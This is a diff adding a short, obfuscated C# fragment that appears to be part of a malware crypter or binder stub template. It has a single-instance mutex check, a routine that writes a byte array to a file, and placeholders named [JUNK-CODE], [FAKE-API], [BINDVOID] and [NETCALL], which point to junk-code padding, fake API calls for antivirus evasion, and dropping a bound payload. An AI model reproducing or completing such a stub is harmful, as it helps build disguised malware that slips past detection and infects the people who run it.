@@ -1,0 +1,25 @@
+
+public static void AA2dBBbBB3(string mutexkey)
+		{
+		bool AA8BB63;
+        new System.Threading.Mutex(true, mutexkey, out AA8BB63);
+        if (!AA8BB63) {Environment.Exit(Environment.ExitCode);};
+		}
+		 
+		[NETCALL]
+		private static void AA1()
+        {
+			[JUNK-CODE]
+        }
+		[BINDVOID]
+        [FAKE-API]
+		 public static bool AA1BB6BB2(string _FileName, byte[] _ByteArray)
+        {   
+         System.IO.FileStream BB24 = new System.IO.FileStream(_FileName, System.IO.FileMode.Create, System.IO.FileAccess.Write);
+         BB24.Write(_ByteArray, 0, _ByteArray.Length);
+         BB24.Close();
+        return true;
+        }   		
+
+
+		
